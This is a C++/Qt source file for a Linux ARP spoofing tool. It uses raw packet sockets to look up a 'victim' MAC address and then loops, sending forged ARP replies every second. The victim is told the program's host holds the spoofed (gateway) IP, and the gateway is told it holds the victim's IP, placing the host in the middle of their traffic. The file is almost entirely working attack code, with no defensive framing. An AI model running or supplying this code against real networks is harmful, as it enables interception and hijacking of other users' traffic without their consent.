#include <QDebug>

#include <cstdlib>
#include <cstdio>

#include <unistd.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#include "arpsender.h"
#include "hostinfo.h"

ARPSender::ARPSender() : hacking(false)
{
    resetSelfIP();
    resetSelfMAC();
}

ARPSender::~ARPSender()
{

}

void ARPSender::resetSelfIP()
{
    for(int i = 0; i < IP_ADDR_LEN; i++){
        own_ip[i] = HostInfo::self_ip[i];
    }
}

void ARPSender::resetSelfMAC()
{
    for(int i = 0; i < MAC_ADDR_LEN; i++){
        own_mac[i] = HostInfo::self_mac[i];
    }
}

void ARPSender::queryMacAddress(const QString& dest_ip)
{
    struct in_addr dest_addr;
    inet_aton(dest_ip.toLatin1().data(), &dest_addr);
    void *reply_sender_addr = &(packet.arp.send_ip_addr);
    void *request_dest_addr = &dest_addr;

    for(int i = 0; i < MAC_ADDR_LEN; i++){
        dest_mac[i] = 0xFF;
    }

    while(memcmp(reply_sender_addr, request_dest_addr, sizeof(dest_addr)) != 0){
        sendARP(dest_ip, ARP_REQUEST);
        receiveARP();
        qDebug() << "arp packet from ip: " << inet_ntoa(*((struct in_addr*)reply_sender_addr));
    }
    getDestMacAddr();
}

void ARPSender::sendARP(const QString &dest_ip, quint16 arp_type)
{
    pack(dest_ip, arp_type);

    struct sockaddr_ll eth_info;
    memset(&eth_info, 0, sizeof(eth_info));
    eth_info.sll_family = PF_PACKET;
    eth_info.sll_ifindex = if_nametoindex(NIC_NAME);
    eth_info.sll_pkttype = PACKET_BROADCAST;
    eth_info.sll_halen = ETH_ALEN;
    eth_info.sll_protocol = htons(ETH_P_ARP);
    for(int i = 0; i < ETH_ALEN; i++){
        eth_info.sll_addr[i] = own_mac[i];
    }
 //   eth_info.sll_hatype = ARPHRD_ETHER;

    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if(sockfd < 0){
        qDebug() << "socket create error";
        return;
    }

    if(bind(sockfd, (struct sockaddr*)(&eth_info), sizeof(eth_info))){
        perror("bind");
        return;
    }

    int num = -1;
    num = sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr*)(&eth_info), sizeof(eth_info));

    if(num < 0){
        qDebug() << "arp send error. " ;
        perror("sendto");
        return;
    }

}

void ARPSender::pack(const QString &ip, quint16 arp_type)
{
    //-----Fill ethernet header
//    char lan_mac[] = {0xDC, 0x85, 0xDE, 0x60, 0x65, 0xE8};
    //Target MAC address
    for(int i = 0; i < MAC_ADDR_LEN; i++){
        packet.ethHeader.target_hw_addr[i] = dest_mac[i];
    }
    //Source MAC address
    for(int i = 0; i < MAC_ADDR_LEN; i++){
        packet.ethHeader.src_hw_addr[i] = own_mac[i];
    }
    //Frame type
    packet.ethHeader.frametype = htons(ETH_FRAME_TYPE_ARP);

    //------Fill ARP header

    //HW address type of MAC
    packet.arp.hw_type = htons(HW_ADDR_TYPE_MAC);

    //Protocol type
    packet.arp.proto_type = htons(ETH_PROTO_IP);

    //HW address length
    packet.arp.hw_addr_size = MAC_ADDR_LEN;
    //Protocol length
    packet.arp.proto_addr_size = IP_ADDR_LEN;

    //Operation type
    packet.arp.op = htons(arp_type);

    for(int i = 0; i < MAC_ADDR_LEN; i++){
        packet.arp.send_hw_addr[i] = own_mac[i];
        packet.arp.recv_hw_addr[i] = 0x00;
    }

    struct in_addr dest_ip;
    quint8 dest_ip_array[IP_ADDR_LEN];

    inet_aton(ip.toLatin1().data(), &dest_ip);
    dest_ip_array[0] = (dest_ip.s_addr) & 0xff;
    dest_ip_array[1] = (dest_ip.s_addr >> 8) & 0xff;
    dest_ip_array[2] = (dest_ip.s_addr >> 16) & 0xff;
    dest_ip_array[3] = (dest_ip.s_addr >> 24) & 0xff;


    for(int i = 0 ;i < IP_ADDR_LEN; i++){
        packet.arp.send_ip_addr[i] = own_ip[i];
        packet.arp.recv_ip_addr[i] = dest_ip_array[i];
    }

    bzero(&packet.arp.padding, sizeof(packet.arp.padding));
}

void ARPSender::receiveARP()
{
    int num = -1;
    num = recvfrom(sockfd, &packet, sizeof(packet), 0, NULL, 0);
    if(num < 0){
        qDebug() << "recvfrom error";
    }else{
        qDebug()  << "received " << num << " bytes.";
    }
    close(sockfd);
}

void ARPSender::getDestMacAddr()
{
    QString dest_mac_string= "";

    for(int i = 0; i < MAC_ADDR_LEN - 1; i++){
        HostInfo::victim_mac[i] = packet.arp.send_hw_addr[i];
        dest_mac_string.append(QString::number(packet.arp.send_hw_addr[i], 16));
        dest_mac_string.append(":");
    }
    HostInfo::victim_mac[MAC_ADDR_LEN - 1] = packet.arp.send_hw_addr[MAC_ADDR_LEN - 1];
    dest_mac_string.append(QString::number(packet.arp.send_hw_addr[MAC_ADDR_LEN - 1], 16));
    emit macAddressReturned(dest_mac_string);
}

void ARPSender::setDestMacGateway()
{
    for(int i = 0; i < MAC_ADDR_LEN; i++){
        dest_mac[i] = HostInfo::gateway_mac[i];
    }
}

void ARPSender::setDestMacVictim()
{
    for(int i = 0; i < MAC_ADDR_LEN; i++){
        dest_mac[i] = HostInfo::victim_mac[i];
    }
}

//Send destination ip ARPs with a faked ip
void ARPSender::startSnoofingAsMonitor(const QString &victim_ip, const QString &faked_ip)
{
    hacking = true;

    while(hacking){
        //Tell "dest ip" I'm the "faked ip"
        setDestMacVictim();
        fakeIP(faked_ip);
        sendARP(victim_ip, ARP_REPLY);
\
        //Tell gateway I'm the "dest ip", so send packets to me, which "dest ip" should gets
        setDestMacGateway();
        fakeIP(victim_ip);
        sendARP(faked_ip, ARP_REPLY);

        sleep(1);
        qDebug() << "Send one arp";
    }
    resetSelfIP();
}

void ARPSender::sendFakedARP(const QString &victim_ip, const QString &faked_ip)
{

}

//Called by SendARPSnoofingThread, to stop this ARP hacking
void ARPSender::stopSnoofing()
{
    qDebug() << "Let's stop this!";
    hacking = false;
}

void ARPSender::fakeIP(const QString &faked_ip)
{
    quint32 sock_addr = 0;
    inet_aton(faked_ip.toLatin1().data(), (struct in_addr*)&sock_addr);
    own_ip[0] = sock_addr & 0xff;
    own_ip[1] = (sock_addr >> 8) & 0xff;
    own_ip[2] = (sock_addr >> 16) & 0xff;
    own_ip[3] = (sock_addr >> 24) & 0xff;
}
